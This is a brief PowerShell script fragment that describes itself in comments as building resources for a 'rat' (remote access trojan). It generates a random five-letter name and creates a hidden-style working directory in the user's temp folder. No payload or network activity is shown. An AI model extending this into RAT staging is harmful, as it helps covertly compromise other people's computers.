#biulds resources for the  rat
# created by Dark Lord


#random string for direcories
 function random_text {
     return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
 }
#working diretory 

$wd = random_text

#goto temp ,make working directory
 cd $env:temp
 mkdir $wd







